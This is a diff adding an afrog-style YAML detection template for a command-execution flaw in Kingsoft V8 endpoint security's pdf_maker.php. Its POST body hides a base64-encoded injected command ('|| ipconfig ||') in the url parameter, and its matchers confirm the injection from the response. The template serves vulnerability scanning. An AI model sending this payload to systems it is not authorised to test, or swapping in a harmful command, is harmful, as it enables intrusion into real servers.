@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Windows IP
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/inter/pdf_maker.php'
+id: kingsoft-v8-rce
+info:
+  author: zan8in
+  description: 金山 V8 终端安全系统 存在命令执行漏洞，攻击者可以通过漏洞执行任意命令
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞
+  severity: critical
+  tags: kingsoft,rce,argus-import
